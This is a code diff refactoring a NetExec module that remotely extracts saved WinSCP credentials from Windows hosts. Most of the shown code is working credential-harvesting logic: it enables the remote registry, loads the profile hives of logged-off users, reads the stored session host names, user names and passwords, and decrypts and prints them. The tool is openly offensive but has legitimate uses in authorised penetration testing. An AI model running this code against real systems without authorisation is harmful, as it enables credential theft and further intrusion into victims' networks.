@@ -52,8 +52,7 @@ class NXCModule:
             context.log.highlight(f"Password: {session[3]}")
 
     def user_object_to_name_mapper(self, context, connection, all_user_objects):
-        try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
+        with RemoteOperations(connection.conn, connection.kerberos) as remote_ops:
             remote_ops.enableRegistry()
 
             reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
@@ -64,8 +63,6 @@ class NXCModule:
                 user_profile_path = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
                 rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
                 self.userDict[user_object] = user_profile_path.split("\\")[-1]
-        finally:
-            remote_ops.finish()
 
     # ==================== Decrypt Password ====================
     def decrypt_passwd(self, host: str, username: str, password: str) -> str:
@@ -118,29 +115,27 @@ class NXCModule:
     def registry_session_extractor(self, context, connection, user_object, sessionName):
         """Extract Session information from registry"""
         try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
-            remote_ops.enableRegistry()
+            with RemoteOperations(connection.conn, connection.kerberos) as remote_ops:
+                remote_ops.enableRegistry()
 
-            reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
-            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\{sessionName}")["phkResult"]
-            host_name = unquote(rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "HostName")[1].split("\x00")[:-1][0])
-            user_name = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UserName")[1].split("\x00")[:-1][0]
-            try:
-                password = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "Password")[1].split("\x00")[:-1][0]
-            except Exception:
-                context.log.debug("Session found but no Password is stored!")
-                password = ""
+                reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
+                key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\{sessionName}")["phkResult"]
+                host_name = unquote(rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "HostName")[1].split("\x00")[:-1][0])
+                user_name = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UserName")[1].split("\x00")[:-1][0]
+                try:
+                    password = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "Password")[1].split("\x00")[:-1][0]
+                except Exception:
+                    context.log.debug("Session found but no Password is stored!")
+                    password = ""
 
-            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
+                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
 
-            dec_password = self.decrypt_passwd(host_name, user_name, password) if password else "NO_PASSWORD_FOUND"
-            section_name = unquote(sessionName)
-            return [section_name, host_name, user_name, dec_password]
+                dec_password = self.decrypt_passwd(host_name, user_name, password) if password else "NO_PASSWORD_FOUND"
+                section_name = unquote(sessionName)
+                return [section_name, host_name, user_name, dec_password]
         except Exception as e:
             context.log.fail(f"Error in Session Extraction: {e}")
             context.log.debug(traceback.format_exc())
-        finally:
-            remote_ops.finish()
         return "ERROR IN SESSION EXTRACTION"
 
     def find_all_logged_in_users_in_registry(self, context, connection):
@@ -148,27 +143,25 @@ class NXCModule:
         user_objects = []
 
         try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
-            remote_ops.enableRegistry()
+            with RemoteOperations(connection.conn, connection.kerberos) as remote_ops:
+                remote_ops.enableRegistry()
 
-            # Enumerate all logged in and loaded Users on System
-            reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
-            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "")["phkResult"]
-            users = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
+                # Enumerate all logged in and loaded Users on System
+                reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
+                key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "")["phkResult"]
+                users = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
 
-            # Get User Names
-            user_names = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
-            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
+                # Get User Names
+                user_names = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
+                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
 
-            # Filter legit users in regex
-            user_names.remove(".DEFAULT")
-            regex = re.compile(r"^.*_Classes$")
-            user_objects = [i for i in user_names if not regex.match(i)]
+                # Filter legit users in regex
+                user_names.remove(".DEFAULT")
+                regex = re.compile(r"^.*_Classes$")
+                user_objects = [i for i in user_names if not regex.match(i)]
         except Exception as e:
             context.log.fail(f"Error handling Users in registry: {e}")
             context.log.debug(traceback.format_exc())
-        finally:
-            remote_ops.finish()
         return user_objects
 
     def find_all_users(self, context, connection):
@@ -176,28 +169,25 @@ class NXCModule:
         user_objects = []
 
         try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
-            remote_ops.enableRegistry()
+            with RemoteOperations(connection.conn, connection.kerberos) as remote_ops:
+                remote_ops.enableRegistry()
 
-            # Enumerate all Users on System
-            reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
-            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList")["phkResult"]
-            users = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
+                # Enumerate all Users on System
+                reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
+                key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList")["phkResult"]
+                users = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
 
-            # Get User Names
-            user_objects = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
-            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
+                # Get User Names
+                user_objects = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
+                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
         except Exception as e:
             context.log.fail(f"Error handling Users in registry: {e}")
             context.log.debug(traceback.format_exc())
-        finally:
-            remote_ops.finish()
         return user_objects
 
     def load_missing_users(self, context, connection, unloaded_user_objects):
         """Extract Information for not logged in Users and then loads them into registry."""
-        try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
+        with RemoteOperations(connection.conn, connection.kerberos) as remote_ops:
             remote_ops.enableRegistry()
 
             for user_object in unloaded_user_objects:
@@ -214,13 +204,10 @@ class NXCModule:
                 context.log.debug(f"LOAD USER INTO REGISTRY: {user_object}")
                 rrp.hBaseRegLoadKey(remote_ops._RemoteOperations__rrp, key_handle, user_object, f"{user_profile_path}\\NTUSER.DAT")
                 rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
-        finally:
-            remote_ops.finish()
 
     def unload_missing_users(self, context, connection, unloaded_user_objects):
         """If some user were not logged in at the beginning we unload them from registry."""
-        try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
+        with RemoteOperations(connection.conn, connection.kerberos) as remote_ops:
             remote_ops.enableRegistry()
 
             # Unload Profile
@@ -235,70 +222,66 @@ class NXCModule:
                     context.log.fail(f"Error unloading user {user_object} in registry: {e}")
                     context.log.debug(traceback.format_exc())
             rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
-        finally:
-            remote_ops.finish()
 
     def check_masterpassword_set(self, context, connection, user_object):
         use_master_password = False
         try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
-            remote_ops.enableRegistry()
+            with RemoteOperations(connection.conn, connection.kerberos) as remote_ops:
+                remote_ops.enableRegistry()
 
-            reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
-            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security")["phkResult"]
-            use_master_password = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseMasterPassword")[1]
-            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
+                reg_handle = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)["phKey"]
+                key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security")["phkResult"]
+                use_master_password = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseMasterPassword")[1]
+                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
         except DCERPCException as e:
             if str(e).find("ERROR_FILE_NOT_FOUND"):
                 context.log.debug("Security configuration registry not found, no master passwords set at all.")
             else:
                 context.log.exception(e)
-        finally:
-            remote_ops.finish()
         return use_master_password
 
     def registry_discover(self, context, connection):
         context.log.display("Looking for WinSCP creds in Registry...")
         try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
-            remote_ops.enableRegistry()
+            with RemoteOperations(connection.conn, connection.kerberos) as remote_ops:
+                remote_ops.enableRegistry()
 
-            # Enumerate all Users on System
-            user_objects = self.find_all_logged_in_users_in_registry(context, connection)
-            all_user_objects = self.find_all_users(context, connection)
-            self.user_object_to_name_mapper(context, connection, all_user_objects)
+                # Enumerate all Users on System
+                user_objects = self.find_all_logged_in_users_in_registry(context, connection)
+                all_user_objects = self.find_all_users(context, connection)
+                self.user_object_to_name_mapper(context, connection, all_user_objects)
 
-            # Users which must be loaded into registry:
-            unloaded_user_objects = list(set(user_objects).symmetric_difference(set(all_user_objects)))
-            self.load_missing_users(context, connection, unloaded_user_objects)
+                # Users which must be loaded into registry:
+                unloaded_user_objects = list(set(user_objects).symmetric_difference(set(all_user_objects)))
+                self.load_missing_users(context, connection, unloaded_user_objects)
 
-            # Retrieve how many sessions are stored in registry from each user_object
-            ans = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)
-            reg_handle = ans["phKey"]
-            for user_object in all_user_objects:
-                try:
-                    key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions")["phkResult"]
-                    sessions = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
-                    context.log.success(f'Found {sessions - 1} sessions for user "{self.userDict[user_object]}" in registry!')
+                # Retrieve how many sessions are stored in registry from each user_object
+                ans = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp)
+                reg_handle = ans["phKey"]
+                for user_object in all_user_objects:
+                    try:
+                        key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"{user_object}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions")["phkResult"]
+                        sessions = rrp.hBaseRegQueryInfoKey(remote_ops._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
+                        context.log.success(f'Found {sessions - 1} sessions for user "{self.userDict[user_object]}" in registry!')
 
-                    # Get Session Names
-                    session_names = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(sessions)]
-                    rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
-                    session_names.remove("Default%20Settings")
+                        # Get Session Names
+                        session_names = [rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(sessions)]
+                        rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
+                        session_names.remove("Default%20Settings")
 
-                    if self.check_masterpassword_set(context, connection, user_object):
-                        context.log.fail("MasterPassword set! Aborting extraction...")
-                        continue
-                    # Extract stored Session infos
-                    for sessionName in session_names:
-                        self.print_creds(context, self.registry_session_extractor(context, connection, user_object, sessionName))
-                except DCERPCException as e:
-                    if str(e).find("ERROR_FILE_NOT_FOUND"):
-                        context.log.debug(f"No WinSCP config found in registry for user {user_object}")
-                except Exception as e:
-                    context.log.fail(f"Unexpected error: {e}")
-                    context.log.debug(traceback.format_exc())
-            self.unload_missing_users(context, connection, unloaded_user_objects)
+                        if self.check_masterpassword_set(context, connection, user_object):
+                            context.log.fail("MasterPassword set! Aborting extraction...")
+                            continue
+                        # Extract stored Session infos
+                        for sessionName in session_names:
+                            self.print_creds(context, self.registry_session_extractor(context, connection, user_object, sessionName))
+                    except DCERPCException as e:
+                        if str(e).find("ERROR_FILE_NOT_FOUND"):
+                            context.log.debug(f"No WinSCP config found in registry for user {user_object}")
+                    except Exception as e:
+                        context.log.fail(f"Unexpected error: {e}")
+                        context.log.debug(traceback.format_exc())
+                self.unload_missing_users(context, connection, unloaded_user_objects)
         except DCERPCException as e:
             # Error during registry query
             if str(e).find("rpc_s_access_denied"):
@@ -306,12 +289,6 @@ class NXCModule:
         except Exception as e:
             context.log.fail(f"UNEXPECTED ERROR: {e}")
             context.log.debug(traceback.format_exc())
-        finally:
-            try:
-                remote_ops.finish()
-            except rrp.DCERPCSessionError as e:
-                # Likely can't stop rrp due to other services dependending on it
-                context.log.debug(f"Error finishing remote operations: {e}")
 
     # ==================== Handle Configs ====================
     def decode_config_file(self, context, confFile):
